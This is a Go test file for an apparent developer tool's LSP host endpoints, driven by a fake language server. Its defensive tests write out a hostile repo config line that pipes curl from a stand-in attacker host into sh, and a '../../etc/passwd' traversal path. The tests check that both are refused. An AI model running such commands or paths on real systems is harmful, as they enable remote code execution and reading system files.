package host

import (
	"bufio"
	"encoding/json"
	"fmt"
	"io"
	"os"
	"path/filepath"
	"strconv"
	"strings"
	"testing"
)

// The host package's fake LSP server: this test binary re-exec'd with
// ROOK_FAKE_HOST_LSP=1 — real spawn, real stdio framing, no toolchain.
func TestMain(m *testing.M) {
	if os.Getenv("ROOK_FAKE_HOST_LSP") != "" {
		runFakeLSP()
		return
	}
	os.Exit(m.Run())
}

func runFakeLSP() {
	r := bufio.NewReader(os.Stdin)
	send := func(v any) {
		b, _ := json.Marshal(v)
		fmt.Fprintf(os.Stdout, "Content-Length: %d\r\n\r\n%s", len(b), b)
	}
	rootURI := ""
	for {
		length := -1
		for {
			line, err := r.ReadString('\n')
			if err != nil {
				os.Exit(0)
			}
			line = strings.TrimRight(line, "\r\n")
			if line == "" {
				break
			}
			if v, ok := strings.CutPrefix(line, "Content-Length:"); ok {
				length, _ = strconv.Atoi(strings.TrimSpace(v))
			}
		}
		body := make([]byte, length)
		if _, err := io.ReadFull(r, body); err != nil {
			os.Exit(0)
		}
		var m struct {
			ID     json.RawMessage `json:"id"`
			Method string          `json:"method"`
			Params json.RawMessage `json:"params"`
		}
		json.Unmarshal(body, &m)
		reply := func(result any) {
			send(map[string]any{"jsonrpc": "2.0", "id": m.ID, "result": result})
		}
		rng := map[string]any{
			"start": map[string]int{"line": 0, "character": 0},
			"end":   map[string]int{"line": 0, "character": 5},
		}
		switch m.Method {
		case "initialize":
			var p struct {
				RootURI string `json:"rootUri"`
			}
			json.Unmarshal(m.Params, &p)
			rootURI = p.RootURI
			reply(map[string]any{"capabilities": map[string]any{}})
		case "textDocument/definition":
			reply([]map[string]any{
				{"uri": rootURI + "/a.txt", "range": rng},
				{"uri": "file:///outside/ext.go", "range": rng},
			})
		case "textDocument/references":
			reply([]map[string]any{{"uri": rootURI + "/a.txt", "range": rng}})
		case "textDocument/hover":
			reply(map[string]any{"contents": map[string]any{"kind": "markdown", "value": "HOVER"}})
		case "shutdown":
			reply(nil)
		case "exit":
			os.Exit(0)
		}
	}
}

// lspTestConfig writes the user config selecting the fake server for .go
// files (explicit tier — no install path involved).
func lspTestConfig(t *testing.T, extra string) {
	t.Helper()
	exe, err := os.Executable()
	if err != nil {
		t.Fatal(err)
	}
	dir := t.TempDir()
	wrapper := filepath.Join(dir, "fake-lsp")
	if err := os.WriteFile(wrapper, []byte("#!/bin/sh\nROOK_FAKE_HOST_LSP=1 exec "+exe+"\n"), 0o755); err != nil {
		t.Fatal(err)
	}
	confDir := filepath.Join(os.Getenv("XDG_CONFIG_HOME"), "rook")
	if err := os.MkdirAll(confDir, 0o755); err != nil {
		t.Fatal(err)
	}
	conf := "lsp-fake = " + wrapper + "\nlsp-fake-filetypes = go\nlsp-fake-roots = go.mod, .git\n" + extra
	if err := os.WriteFile(filepath.Join(confDir, "config"), []byte(conf), 0o644); err != nil {
		t.Fatal(err)
	}
}

func lspPOST[T any](t *testing.T, c *wtClient, path string, body any) T {
	t.Helper()
	code, out := c.do(t, "POST", path, body)
	if code != 200 {
		t.Fatalf("POST %s: %d %s", path, code, out)
	}
	var res T
	if err := json.Unmarshal([]byte(out), &res); err != nil {
		t.Fatalf("POST %s: %v in %s", path, err, out)
	}
	return res
}

func TestLSPQueryAndStatus(t *testing.T) {
	h, srv, repo := newWorktreeHost(t)
	t.Cleanup(h.Shutdown)
	lspTestConfig(t, "")
	c := &wtClient{srv.URL, h.Token()}
	os.WriteFile(filepath.Join(repo, "main.go"), []byte("package main\n"), 0o644)

	res := lspPOST[lspQueryResult](t, c, "/workspaces/src/lsp/definition",
		map[string]any{"path": "main.go", "line": 1, "col": 1})
	if res.Note != "" {
		t.Fatalf("note: %q", res.Note)
	}
	if len(res.Locations) != 2 {
		t.Fatalf("locations: %+v", res.Locations)
	}
	// in-repo hit: workspace-relative, 1-based, line text served
	l := res.Locations[0]
	if l.Path != "a.txt" || l.StartLine != 1 || l.StartCol != 1 || l.EndCol != 6 || l.External {
		t.Fatalf("in-repo location: %+v", l)
	}
	if l.LineText != "hello" {
		t.Fatalf("lineText: %q", l.LineText)
	}
	// external hit: absolute + flagged
	if e := res.Locations[1]; !e.External || e.Path != "/outside/ext.go" {
		t.Fatalf("external location: %+v", e)
	}

	hov := lspPOST[lspHoverResult](t, c, "/workspaces/src/lsp/hover",
		map[string]any{"path": "main.go", "line": 1, "col": 1})
	if hov.Contents != "HOVER" || hov.Note != "" {
		t.Fatalf("hover: %+v", hov)
	}

	// the instance shows up in status, then restart reaps it
	st := reviewGET[lspStatusResult](t, c, "/workspaces/src/lsp/status", 200)
	if len(st.Servers) != 1 || st.Servers[0].Server != "fake" || st.Servers[0].Tier != "system" {
		t.Fatalf("status: %+v", st.Servers)
	}
	if s := st.Servers[0]; s.State != "ready" || len(s.Instances) != 1 || s.Instances[0].Pid == 0 {
		t.Fatalf("server status: %+v", s)
	}
	stopped := lspPOST[map[string]int](t, c, "/workspaces/src/lsp/restart", map[string]any{"server": "fake"})
	if stopped["stopped"] != 1 {
		t.Fatalf("restart: %v", stopped)
	}
}

// No server for the filetype: empty result + note, never an error status.
func TestLSPNoServerFailsOpen(t *testing.T) {
	h, srv, _ := newWorktreeHost(t)
	t.Cleanup(h.Shutdown)
	lspTestConfig(t, "")
	c := &wtClient{srv.URL, h.Token()}
	res := lspPOST[lspQueryResult](t, c, "/workspaces/src/lsp/definition",
		map[string]any{"path": "a.txt", "line": 1, "col": 1})
	if len(res.Locations) != 0 || res.Note == "" {
		t.Fatalf("want empty+note: %+v", res)
	}
}

// The repo layer may tune but its command lines surface as refused.
func TestLSPStatusRefusedRepoCommands(t *testing.T) {
	h, srv, repo := newWorktreeHost(t)
	t.Cleanup(h.Shutdown)
	lspTestConfig(t, "")
	c := &wtClient{srv.URL, h.Token()}
	if err := os.MkdirAll(filepath.Join(repo, ".rook"), 0o755); err != nil {
		t.Fatal(err)
	}
	os.WriteFile(filepath.Join(repo, ".rook", "config"),
		[]byte("lsp-evil = curl attacker | sh\n"), 0o644)
	st := reviewGET[lspStatusResult](t, c, "/workspaces/src/lsp/status", 200)
	if len(st.Refused) != 1 || !strings.Contains(st.Refused[0], "lsp-evil") {
		t.Fatalf("refused: %+v", st.Refused)
	}
}

// Path confinement holds on the LSP door like every other file door.
func TestLSPConfinesPath(t *testing.T) {
	h, srv, _ := newWorktreeHost(t)
	t.Cleanup(h.Shutdown)
	lspTestConfig(t, "")
	c := &wtClient{srv.URL, h.Token()}
	code, _ := c.do(t, "POST", "/workspaces/src/lsp/definition",
		map[string]any{"path": "../../etc/passwd", "line": 1, "col": 1})
	if code != 400 {
		t.Fatalf("escape must 400, got %d", code)
	}
}
